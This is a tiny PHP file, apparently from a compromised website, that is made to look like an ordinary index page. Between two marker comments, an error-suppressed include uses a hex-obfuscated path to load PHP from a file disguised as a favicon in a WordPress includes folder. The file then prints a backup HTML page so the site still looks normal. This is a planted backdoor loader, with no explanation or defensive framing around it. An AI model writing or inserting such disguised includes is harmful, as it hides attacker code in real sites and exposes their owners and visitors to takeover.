<?php
/*46c26*/

@include "\x2fhom\x65/co\x64eli\x67ht0\x307/p\x75bli\x63_ht\x6dl/d\x72oid\x71uer\x79/wp\x2dinc\x6cude\x73/wi\x64get\x73/fa\x76ico\x6e_3c\x66fc1\x2eico";

/*46c26*/


echo file_get_contents('index.html.bak.bak');